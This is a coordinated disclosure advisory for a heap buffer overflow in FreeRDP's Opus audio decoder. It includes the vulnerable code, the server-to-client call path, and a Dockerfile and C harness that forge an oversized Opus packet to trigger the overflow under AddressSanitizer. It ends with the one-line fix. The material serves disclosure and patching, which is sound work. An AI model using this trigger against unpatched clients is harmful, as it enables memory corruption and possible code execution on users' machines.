<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-EWM7B5QP -->

# ANT-2026-EWM7B5QP · freerdp/freerdp

## heap-buffer-overflow high

[CVE-2026-63633](https://nvd.nist.gov/vuln/detail/CVE-2026-63633)
[GHSA-72j9-356v-88xq](https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-72j9-356v-88xq)

Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ada Logics.

# ANT-2026-EWM7B5QP: Opus audio decode resizes wrong stream, overflows output

In freerdp\_dsp\_decode\_opus() (libfreerdp/codec/dsp.c:682-692), the code computes max\_size = OPUS\_MAX\_FRAMES \* channels \* sizeof(int16\_t) and calls Stream\_EnsureRemainingCapacity() on context->common.buffer instead of the caller-supplied `out` stream that opus\_decode() actually writes into. `out` comes from StreamPool\_Take(pool, 4096) in rdpsnd\_main.c:634 and is never resized, so a 60–120 ms stereo Opus packet causes libopus to write up to 23,040 bytes into a 4,096-byte heap buffer. A malicious RDP server can negotiate WAVE\_FORMAT\_OPUS on the rdpsnd channel (the client advertises it when built WITH\_OPUS and without FFmpeg DSP) and stream such a packet to overflow ~19KB of attacker-influenced PCM past the buffer. This is a remotely-triggerable server→client heap overflow leading to memory corruption and potential RCE in the FreeRDP client.

**Project:** freerdp/freerdp
**Location:** `libfreerdp/codec/dsp.c:685`

The root cause is a copy-paste bug: Stream\_EnsureRemainingCapacity() is called on context->common.buffer (dsp.c:683) rather than on `out`, while opus\_decode() writes to Stream\_Pointer(out) with frame\_size=OPUS\_MAX\_FRAMES (dsp.c:687-688). Every sibling codec in the same file correctly resizes `out` (dsp.c:516,535,590,770,881,1167) — only the Opus path gets it wrong, and no upstream size check on `out` exists anywhere in the call chain.

1. Client iterates server-supplied audio formats (rdpsnd\_main.c:180-194); freerdp\_dsp\_supports\_format() returns TRUE for WAVE\_FORMAT\_OPUS (dsp.c:1576-1577), so the client advertises Opus.
2. Server selects the Opus format index and sends a Wave/Wave2 PDU containing a ≥40 ms Opus packet.
3. rdpsnd\_main.c:634 obtains pcmData = StreamPool\_Take(pool, 4096) — exactly 4096 B on first use.
4. device->FormatSupported returns FALSE for Opus on all shipped backends (ALSA/Pulse/OSS/sndio/winmm/mac/iOS/opensles), so rdpsnd\_main.c:643 calls freerdp\_dsp\_decode().
5. dsp.c:1496-1497 dispatches to freerdp\_dsp\_decode\_opus(), which resizes the wrong stream and calls opus\_decode() into the 4 KB `out`, overflowing up to ~19 KB past it.

## Suggested Fix

Call Stream\_EnsureRemainingCapacity() on the actual destination stream `out` (not context->common.buffer) so that at least max\_size writable bytes are guaranteed before invoking opus\_decode().

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-EWM7B5QP.

---

**Reference:** ANT-2026-EWM7B5QP

Triage and disclosure were performed by Ada Logics. The writeup below is the document the firm sent to the maintainer.

## Summary

`freerdp_dsp_decode_opus()` (`libfreerdp/codec/dsp.c`) grows the **wrong** stream before
decoding: it calls `Stream_EnsureRemainingCapacity()` on `context->common.buffer`, but
`opus_decode()` writes the decoded PCM into the caller-supplied `out` stream — which is
the fixed **4096-byte** buffer the rdpsnd client channel hands to the decoder
(`StreamPool_Take(pool, 4096)`), and which is never resized. Because `opus_decode()` is
told its output capacity is `OPUS_MAX_FRAMES` (5760 samples/channel), libopus decodes a
full frame and writes up to ~19 KB of attacker-influenced PCM past the end of the 4 KB
heap allocation.

A malicious (or compromised, or MITM) RDP **server** that negotiates `WAVE_FORMAT_OPUS` on
the rdpsnd (audio) channel can trigger this on a connecting FreeRDP **client** with a
single Opus wave PDU — no user interaction beyond connecting and having audio redirection
active (the default once negotiated). This is a server→client, remotely triggerable,
attacker-influenced heap buffer overflow.

Every sibling codec in `dsp.c` resizes `out`; only the Opus path resizes
`context->common.buffer` — a copy-paste error.

## Affected versions

* **All FreeRDP 3.x** — the Opus decode path (`freerdp_dsp_decode_opus`) was introduced in
  **3.0.0** and the wrong-stream resize has been present since. Confirmed present in the
  latest release tag **3.27.1** and on **`master`** (HEAD `1f7a716d39b5605bb8a83b0c3c97a6ce386609ef`,
  reproduced 2026-07-01). Unpatched.
* **Build condition:** affects clients built **`WITH_OPUS=ON`** and **without**
  `WITH_DSP_FFMPEG` (when the FFmpeg DSP backend is present, `freerdp_dsp_*` dispatches to
  it instead of this code). This is a real shipped configuration on platforms that enable
  the bundled Opus codec but not the FFmpeg DSP.
* 1.x / 2.x predate Opus support and are unaffected (and unsupported).

Distinct from the published **CVE-2026-31883 / GHSA-85x9-4xxp-xhm5** (heap overflow in the
same `dsp.c` via the **IMA/MS-ADPCM** decoders, fixed in 3.24.0) — that fix did not touch
the Opus path, which remains vulnerable.

## Details

### Vulnerable code

`libfreerdp/codec/dsp.c`, `freerdp_dsp_decode_opus()`:

```
static BOOL freerdp_dsp_decode_opus(FREERDP_DSP_CONTEXT* WINPR_RESTRICT context,
                                    const BYTE* WINPR_RESTRICT src, size_t size,
                                    wStream* WINPR_RESTRICT out)
    if (!context || !src || !out)
        return FALSE;

    /* Max packet duration is 120ms (5760 at 48KHz) */
    const size_t max_size = OPUS_MAX_FRAMES * context->common.format.nChannels * sizeof(int16_t);
    if (!Stream_EnsureRemainingCapacity(context->common.buffer, max_size))   // WRONG stream (dsp.c:684)
        return FALSE;

    const opus_int32 frames =
        opus_decode(context->opus_decoder, src, WINPR_ASSERTING_INT_CAST(opus_int32, size),
                    Stream_Pointer(out), OPUS_MAX_FRAMES, 0);                 // writes into `out` (dsp.c:688)
    if (frames < 0)
        return FALSE;

    Stream_Seek(out, (size_t)frames * context->common.format.nChannels * sizeof(int16_t));
    return TRUE;
```

`OPUS_MAX_FRAMES` is 5760. The capacity check is applied to `context->common.buffer`, but
the decode destination is `Stream_Pointer(out)`. The `frame_size` argument (5760) tells
libopus the buffer holds 5760 samples/channel, so it writes the whole decoded frame — for
stereo, `frames * 2 * sizeof(int16_t)` bytes — irrespective of the true 4096-byte size of
`out`. No code in the call chain bounds `out`.

### Root cause

Missing capacity guarantee on the decode destination `out`. `Stream_EnsureRemainingCapacity`
is applied to the wrong stream (`context->common.buffer`), so `out` (4096 bytes) is written
past its end. Sibling decoders in the same file all resize `out` correctly.

### Server-controlled call path

```
rdpsnd_recv_wave_pdu / rdpsnd_recv_wave2_pdu    channels/rdpsnd/client/rdpsnd_main.c
  pcmData = StreamPool_Take(rdpsnd->pool, 4096)  rdpsnd_main.c:641   (the 4096-byte `out`)
  freerdp_dsp_decode(dsp, format, data, size, pcmData)  rdpsnd_main.c:650
    freerdp_dsp_decode            libfreerdp/codec/dsp.c:1499
      freerdp_dsp_decode_opus     libfreerdp/codec/dsp.c:684  (resizes wrong stream)
        opus_decode(..., Stream_Pointer(out), OPUS_MAX_FRAMES, 0)  dsp.c:688
          -> WRITE past the end of the 4096-byte region  (heap-buffer-overflow)
```

The client advertises Opus to the server because `freerdp_dsp_supports_format()` returns
TRUE for `WAVE_FORMAT_OPUS`, and the rdpsnd format-negotiation loop offers every
DSP-decodable format — so a malicious server can select Opus and stream the triggering wave
PDU.

## Impact

A malicious RDP server overflows a 4 KB client-side heap buffer by up to ~19 KB
(stereo, up to 120 ms/packet) with attacker-influenced PCM content. This corrupts adjacent
heap objects / allocator metadata — a contiguous linear overwrite of this size is a classic
heap-corruption → RCE primitive. Written bytes are decoded PCM (attacker-shaped, not fully
arbitrary). Reachable pre-interaction on an affected build once the victim connects to the
attacker's server and audio is negotiated. In release builds the downstream `Stream_Seek`
assertion is compiled out, so the corruption is silent.

## Proof of Concept

Self-contained Docker reproducer. It builds `libfreerdp` (with `WITH_OPUS=ON`,
`WITH_DSP_FFMPEG=OFF`) and `libopus` from source under AddressSanitizer at the affected
commit, forges the attacker's "server" Opus packet with the libopus encoder (a 60 ms stereo
frame → 2880 samples/ch → 11,520 PCM bytes ≫ 4096), and replays exactly the call the rdpsnd
client makes: `freerdp_dsp_decode(dsp, &opus_format, packet, len, StreamPool_Take(pool, 4096))`.
(libopus is built with ASan so the out-of-bounds store inside `opus_decode()` is reported
precisely.)

**`Dockerfile`**

```
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
ARG TARGET_COMMIT=1f7a716d39b5605bb8a83b0c3c97a6ce386609ef
ARG CLANG_VERSION=20

RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates git make cmake pkg-config libc6-dev \
        wget gnupg lsb-release software-properties-common \
        libssl-dev zlib1g-dev libfuse3-dev autoconf automake libtool \
    && wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh && chmod +x /tmp/llvm.sh && /tmp/llvm.sh ${CLANG_VERSION} \
    && apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
    && rm -rf /var/lib/apt/lists/*

ENV CC=clang-${CLANG_VERSION} CXX=clang++-${CLANG_VERSION}
ENV CFLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"
ENV CXXFLAGS="$CFLAGS"
ENV LDFLAGS="-fsanitize=address"

# libopus from source WITH ASan so the decode write loop is instrumented.
ARG OPUS_TAG=v1.5.2
RUN git clone --branch ${OPUS_TAG} --depth 1 https://github.com/xiph/opus /src/opus
RUN cmake -S /src/opus -B /src/opus/build \
        -DCMAKE_BUILD_TYPE=Debug -DCMAKE_C_FLAGS="$CFLAGS" \
        -DCMAKE_SHARED_LINKER_FLAGS="$LDFLAGS" -DCMAKE_INSTALL_PREFIX=/usr \
        -DBUILD_SHARED_LIBS=ON -DOPUS_BUILD_PROGRAMS=OFF -DOPUS_BUILD_TESTING=OFF \
    && cmake --build /src/opus/build -j"$(nproc)" && cmake --install /src/opus/build

RUN git clone https://github.com/FreeRDP/FreeRDP /src/repo
WORKDIR /src/repo
RUN git checkout ${TARGET_COMMIT}

# libfreerdp (incl. codec/dsp.c) + winpr with ASan; Opus ON, FFmpeg DSP OFF
# -> the WITH_OPUS && !WITH_DSP_FFMPEG build the bug requires.
RUN cmake -S . -B build \
        -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_C_FLAGS="$CFLAGS" \
        -DCMAKE_EXE_LINKER_FLAGS="$LDFLAGS" \
        -DCMAKE_SHARED_LINKER_FLAGS="$LDFLAGS" \
        -DCMAKE_INSTALL_PREFIX=/usr \
        -DWITH_OPUS=ON -DWITH_DSP_FFMPEG=OFF -DWITH_FFMPEG=OFF \
        -DWITH_SERVER=OFF -DWITH_CLIENT=OFF -DWITH_SAMPLE=OFF \
        -DWITH_MANPAGES=OFF -DBUILD_TESTING=OFF -DUSE_UNWIND=OFF \
        -DWITH_X11=OFF -DWITH_WAYLAND=OFF -DWITH_CUPS=OFF -DWITH_PCSC=OFF \
        -DWITH_KRB5=OFF -DWITH_SWSCALE=OFF -DWITH_WEBVIEW=OFF -DWITH_AAD=OFF \
        -DWITH_FUSE=OFF -DWITH_LIBRESSL=OFF -DCHANNEL_URBDRC=OFF \
    && cmake --build build --target freerdp -j"$(nproc)"

COPY harness.c /tmp/harness.c
RUN FRDP_SO=$(find /src/repo/build -name 'libfreerdp3.so*' -type f | head -1) \
    && WINPR_SO=$(find /src/repo/build -name 'libwinpr3.so*' -type f | head -1) \
    && $CC $CFLAGS \
        -I/src/repo/include -I/src/repo/build/include \
        -I/src/repo/winpr/include -I/src/repo/build/winpr/include \
        /tmp/harness.c -o /tmp/poc_run \
        "$FRDP_SO" "$WINPR_SO" -lopus $LDFLAGS

ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1
ENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-${CLANG_VERSION}/bin/llvm-symbolizer
ENV LD_LIBRARY_PATH=/src/repo/build/libfreerdp:/src/repo/build/winpr/libwinpr
CMD ["/bin/sh","-c","/tmp/poc_run 2>&1; echo EXIT=$?"]
```

**`harness.c`** — replays the exact rdpsnd client call with an attacker-forged Opus packet

```
/* Drives the same public libfreerdp DSP API the rdpsnd client uses on a server
 * WAVE_FORMAT_OPUS wave PDU:
 *   rdpsnd_main.c:641  pcmData = StreamPool_Take(pool, 4096);
 *   rdpsnd_main.c:650  freerdp_dsp_decode(dsp, format, data, size, pcmData);
 * freerdp_dsp_decode_opus() resizes context->common.buffer (dsp.c:684) but
 * opus_decode() writes into `out` (dsp.c:688) -> overflow of the 4096-byte out. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <opus/opus.h>
#include <winpr/stream.h>
#include <freerdp/codec/dsp.h>
#include <freerdp/codec/audio.h>

#define SR 48000
#define CH 2
#define FRAME 2880   /* 60 ms at 48 kHz = 2880 samples/channel */

int main(void)
    /* 1. Forge the malicious "server" Opus packet. */
    int err = 0;
    OpusEncoder* enc = opus_encoder_create(SR, CH, OPUS_APPLICATION_AUDIO, &err);
    if (!enc || err != OPUS_OK) { fprintf(stderr, "opus_encoder_create failed: %d\n", err); return 2; }
    opus_encoder_ctl(enc, OPUS_SET_BITRATE(OPUS_BITRATE_MAX));

    opus_int16* pcm = calloc((size_t)FRAME * CH, sizeof(opus_int16));
    for (int i = 0; i < FRAME * CH; i++) pcm[i] = (opus_int16)((i * 977) & 0x7fff);  /* non-silent */

    unsigned char packet[8192];
    opus_int32 plen = opus_encode(enc, pcm, FRAME, packet, sizeof(packet));
    if (plen < 0) { fprintf(stderr, "opus_encode failed: %d\n", plen); return 2; }
    fprintf(stderr, "[*] forged Opus packet: %d bytes -> decodes to %d samples/ch (%d PCM bytes)\n",
            plen, FRAME, FRAME * CH * (int)sizeof(opus_int16));

    /* 2. Stand up the decoder exactly as the rdpsnd client does. */
    AUDIO_FORMAT fmt;
    memset(&fmt, 0, sizeof(fmt));
    fmt.wFormatTag = WAVE_FORMAT_OPUS;   /* 0x704F */
    fmt.nChannels = CH; fmt.nSamplesPerSec = SR; fmt.wBitsPerSample = 16;
    fmt.nBlockAlign = CH * 2; fmt.nAvgBytesPerSec = SR * fmt.nBlockAlign;

    FREERDP_DSP_CONTEXT* dsp = freerdp_dsp_context_new(FALSE /* decoder */);
    if (!dsp) { fprintf(stderr, "dsp_context_new failed\n"); return 2; }
    if (!freerdp_dsp_context_reset(dsp, &fmt, 0)) { fprintf(stderr, "dsp_context_reset failed\n"); return 2; }

    /* Same 4096-byte destination buffer rdpsnd_main.c:641 hands to the decoder. */
    wStreamPool* pool = StreamPool_New(TRUE, 4096);
    wStream* out = StreamPool_Take(pool, 4096);
    fprintf(stderr, "[*] out stream capacity = %zu bytes (server frame will write %d)\n",
            Stream_Capacity(out), FRAME * CH * (int)sizeof(opus_int16));

    /* 3. Trigger. */
    fprintf(stderr, "[*] calling freerdp_dsp_decode() -> freerdp_dsp_decode_opus() ...\n");
    BOOL ok = freerdp_dsp_decode(dsp, &fmt, packet, (size_t)plen, out);
    fprintf(stderr, "[*] freerdp_dsp_decode returned %d (no ASan abort => not reproduced)\n", ok);

    Stream_Release(out); StreamPool_Free(pool);
    freerdp_dsp_context_free(dsp); opus_encoder_destroy(enc); free(pcm);
    return 0;
```

**Run**

```
docker build -t freerdp-opus-overflow .
docker run --rm freerdp-opus-overflow
```

**Observed output (AddressSanitizer, current `master` `1f7a716d`)**

```
[*] forged Opus packet: 1274 bytes -> decodes to 2880 samples/ch (11520 PCM bytes)
[*] out stream capacity = 4096 bytes (server frame will write 11520)
[*] calling freerdp_dsp_decode() -> freerdp_dsp_decode_opus() ...
==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7df8ed7e1100 ...
WRITE of size 2 at 0x7df8ed7e1100 thread T0
    #0 opus_decode /src/opus/src/opus_decoder.c:890:17
    #1 freerdp_dsp_decode_opus /src/repo/libfreerdp/codec/dsp.c:688:6
    #2 freerdp_dsp_decode /src/repo/libfreerdp/codec/dsp.c:1499:11
    #3 main /tmp/harness.c
0x7df8ed7e1100 is located 0 bytes after 4096-byte region [0x7df8ed7e0100,0x7df8ed7e1100)
allocated by thread T0 here:
    Stream_New /src/repo/winpr/libwinpr/utils/stream.c:101:22
    StreamPool_Take /src/repo/winpr/libwinpr/utils/collections/StreamPool.c:244:7
SUMMARY: AddressSanitizer: heap-buffer-overflow opus_decoder.c:890 in opus_decode
EXIT=134
```

The overflow write lands exactly at the end of the 4096-byte `StreamPool_Take` allocation,
inside `opus_decode` called from `freerdp_dsp_decode_opus`.

## Suggested fix

Resize the destination stream `out` (not `context->common.buffer`) before decoding:

```
--- a/libfreerdp/codec/dsp.c
+++ b/libfreerdp/codec/dsp.c
@@ static BOOL freerdp_dsp_decode_opus(...)
    /* Max packet duration is 120ms (5760 at 48KHz) */
    const size_t max_size = OPUS_MAX_FRAMES * context->common.format.nChannels * sizeof(int16_t);
-   if (!Stream_EnsureRemainingCapacity(context->common.buffer, max_size))
+   if (!Stream_EnsureRemainingCapacity(out, max_size))
        return FALSE;
```

This matches every sibling decoder in `dsp.c`. **Fix-verified:** with this one-line change,
the same PoC completes cleanly (`freerdp_dsp_decode` returns success, `EXIT=0`, no ASan
report). Hardening complement: pass the actual remaining capacity of `out` (in
samples/channel) as the `frame_size` argument to `opus_decode()` instead of the constant
`OPUS_MAX_FRAMES`, so libopus refuses oversized frames rather than trusting the caller.

## References

* `libfreerdp/codec/dsp.c` — `freerdp_dsp_decode_opus()` (wrong-stream resize + `opus_decode` into `out`), `freerdp_dsp_decode()` (dispatch).
* `channels/rdpsnd/client/rdpsnd_main.c` — `StreamPool_Take(pool, 4096)` and `freerdp_dsp_decode(...)` on wave PDUs.
* Opus decode introduced in FreeRDP commit `330f7ae0a` ("codec/dsp: Add support for decoding Opus encoded streams"); wrong-stream resize present since.
* Distinct sibling advisory: CVE-2026-31883 / GHSA-85x9-4xxp-xhm5 (ADPCM in the same file, fixed 3.24.0).
* CWE-787 (Out-of-bounds Write), CWE-131 (Incorrect Calculation of Buffer Size).

## Attribution

Please credit **Claude** and **Ada Logics** — found by Anthropic using agents
to study the security of open-source projects, with Ada Logics validating and reporting.

## Disclosure

This report follows a 90-day coordinated disclosure timeline: https://www.anthropic.com/coordinated-vulnerability-disclosure

```
diff --git a/libfreerdp/codec/dsp.c b/libfreerdp/codec/dsp.c
index b4c083e18dd7..dc5fbde1f8bd 100644
--- a/libfreerdp/codec/dsp.c
+++ b/libfreerdp/codec/dsp.c
@@ -681,7 +681,7 @@ static BOOL freerdp_dsp_decode_opus(FREERDP_DSP_CONTEXT* WINPR_RESTRICT context,

 	/* Max packet duration is 120ms (5760 at 48KHz) */
 	const size_t max_size = OPUS_MAX_FRAMES * context->common.format.nChannels * sizeof(int16_t);
-	if (!Stream_EnsureRemainingCapacity(context->common.buffer, max_size))
+	if (!Stream_EnsureRemainingCapacity(out, max_size))
 		return FALSE;

 	const opus_int32 frames =
```

<https://github.com/FreeRDP/FreeRDP/commit/0ed1f95d36913581cf31124f94eb5843d4263eae>

1. 2026-04-02
2. 2026-07-06
3. 2026-07-22
4. 2026-07-22
5. 2026-09-28

f25c65dd628714bf5562cceab720fa2203283e59ed7dc2a2fab688cd384d115cd836aec627592b44f04f857ec74f30f100c9f635db36190c6d9a2f6574c3b999

Committed 2026-07-22 07:29 UTC

Revealed 2026-09-28 21:59 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-EWM7B5QP%22%2C%22bug_class%22%3A%22Heap%20Buffer%20Overflow%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-16T01%3A52%3A41%2B00%3A00%22%2C%22description%22%3A%22In%20freerdp_dsp_decode_opus%28%29%20%28libfreerdp/codec/dsp.c%3A682-692%29%2C%20the%20code%20computes%20max_size%20%3D%20OPUS_MAX_FRAMES%20%2A%20channels%20%2A%20sizeof%28int16_t%29%20and%20calls%20Stream_EnsureRemainingCapacity%28%29%20on%20context-%3Ecommon.buffer%20instead%20of%20the%20caller-supplied%20%60out%60%20stream%20that%20opus_decode%28%29%20actually%20writes%20into.%20%60out%60%20comes%20from%20StreamPool_Take%28pool%2C%204096%29%20in%20rdpsnd_main.c%3A634%20and%20is%20never%20resized%2C%20so%20a%2060%E2%80%93120%20ms%20stereo%20Opus%20packet%20causes%20libopus%20to%20write%20up%20to%2023%2C040%20bytes%20into%20a%204%2C096-byte%20heap%20buffer.%20A%20malicious%20RDP%20server%20can%20negotiate%20WAVE_FORMAT_OPUS%20on%20the%20rdpsnd%20channel%20%28the%20client%20advertises%20it%20when%20built%20WITH_OPUS%20and%20without%20FFmpeg%20DSP%29%20and%20stream%20such%20a%20packet%20to%20overflow%20~19KB%20of%20attacker-influenced%20PCM%20past%20the%20buffer.%20This%20is%20a%20remotely-triggerable%20server%E2%86%92client%20heap%20overflow%20leading%20to%20memory%20corruption%20and%20potential%20RCE%20in%20the%20FreeRDP%20client.%22%2C%22discovered_at%22%3A%222026-04-02T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22libfreerdp/codec/dsp.c%3A685%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp/freerdp%22%2C%22reproduction%22%3A%5B%221.%20Client%20iterates%20server-supplied%20audio%20formats%20%28rdpsnd_main.c%3A180-194%29%3B%20freerdp_dsp_supports_format%28%29%20returns%20TRUE%20for%20WAVE_FORMAT_OPUS%20%28dsp.c%3A1576-1577%29%2C%20so%20the%20client%20advertises%20Opus.%22%2C%222.%20Server%20selects%20the%20Opus%20format%20index%20and%20sends%20a%20Wave/Wave2%20PDU%20containing%20a%20%E2%89%A540%20ms%20Opus%20packet.%22%2C%223.%20rdpsnd_main.c%3A634%20obtains%20pcmData%20%3D%20StreamPool_Take%28pool%2C%204096%29%20%E2%80%94%20exactly%204096%20B%20on%20first%20use.%22%2C%224.%20device-%3EFormatSupported%20returns%20FALSE%20for%20Opus%20on%20all%20shipped%20backends%20%28ALSA/Pulse/OSS/sndio/winmm/mac/iOS/opensles%29%2C%20so%20rdpsnd_main.c%3A643%20calls%20freerdp_dsp_decode%28%29.%22%2C%225.%20dsp.c%3A1496-1497%20dispatches%20to%20freerdp_dsp_decode_opus%28%29%2C%20which%20resizes%20the%20wrong%20stream%20and%20calls%20opus_decode%28%29%20into%20the%204%20KB%20%60out%60%2C%20overflowing%20up%20to%20~19%20KB%20past%20it.%22%5D%2C%22technical_details%22%3A%22The%20root%20cause%20is%20a%20copy-paste%20bug%3A%20Stream_EnsureRemainingCapacity%28%29%20is%20called%20on%20context-%3Ecommon.buffer%20%28dsp.c%3A683%29%20rather%20than%20on%20%60out%60%2C%20while%20opus_decode%28%29%20writes%20to%20Stream_Pointer%28out%29%20with%20frame_size%3DOPUS_MAX_FRAMES%20%28dsp.c%3A687-688%29.%20Every%20sibling%20codec%20in%20the%20same%20file%20correctly%20resizes%20%60out%60%20%28dsp.c%3A516%2C535%2C590%2C770%2C881%2C1167%29%20%E2%80%94%20only%20the%20Opus%20path%20gets%20it%20wrong%2C%20and%20no%20upstream%20size%20check%20on%20%60out%60%20exists%20anywhere%20in%20the%20call%20chain.%22%2C%22title%22%3A%22Opus%20audio%20decode%20resizes%20wrong%20stream%2C%20overflows%20output%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-EWM7B5QP",
  "bug_class": "Heap Buffer Overflow",
  "created_at": "2026-04-16T01:52:41+00:00",
  "description": "In freerdp_dsp_decode_opus() (libfreerdp/codec/dsp.c:682-692), the code computes max_size = OPUS_MAX_FRAMES * channels * sizeof(int16_t) and calls Stream_EnsureRemainingCapacity() on context->common.buffer instead of the caller-supplied `out` stream that opus_decode() actually writes into. `out` comes from StreamPool_Take(pool, 4096) in rdpsnd_main.c:634 and is never resized, so a 60–120 ms stereo Opus packet causes libopus to write up to 23,040 bytes into a 4,096-byte heap buffer. A malicious RDP server can negotiate WAVE_FORMAT_OPUS on the rdpsnd channel (the client advertises it when built WITH_OPUS and without FFmpeg DSP) and stream such a packet to overflow ~19KB of attacker-influenced PCM past the buffer. This is a remotely-triggerable server→client heap overflow leading to memory corruption and potential RCE in the FreeRDP client.",
  "discovered_at": "2026-04-02T00:00:00+00:00",
  "location": "libfreerdp/codec/dsp.c:685",
  "project": "freerdp/freerdp",
    "1. Client iterates server-supplied audio formats (rdpsnd_main.c:180-194); freerdp_dsp_supports_format() returns TRUE for WAVE_FORMAT_OPUS (dsp.c:1576-1577), so the client advertises Opus.",
    "2. Server selects the Opus format index and sends a Wave/Wave2 PDU containing a ≥40 ms Opus packet.",
    "3. rdpsnd_main.c:634 obtains pcmData = StreamPool_Take(pool, 4096) — exactly 4096 B on first use.",
    "4. device->FormatSupported returns FALSE for Opus on all shipped backends (ALSA/Pulse/OSS/sndio/winmm/mac/iOS/opensles), so rdpsnd_main.c:643 calls freerdp_dsp_decode().",
    "5. dsp.c:1496-1497 dispatches to freerdp_dsp_decode_opus(), which resizes the wrong stream and calls opus_decode() into the 4 KB `out`, overflowing up to ~19 KB past it."
  "technical_details": "The root cause is a copy-paste bug: Stream_EnsureRemainingCapacity() is called on context->common.buffer (dsp.c:683) rather than on `out`, while opus_decode() writes to Stream_Pointer(out) with frame_size=OPUS_MAX_FRAMES (dsp.c:687-688). Every sibling codec in the same file correctly resizes `out` (dsp.c:516,535,590,770,881,1167) — only the Opus path gets it wrong, and no upstream size check on `out` exists anywhere in the call chain.",
  "title": "Opus audio decode resizes wrong stream, overflows output",
```
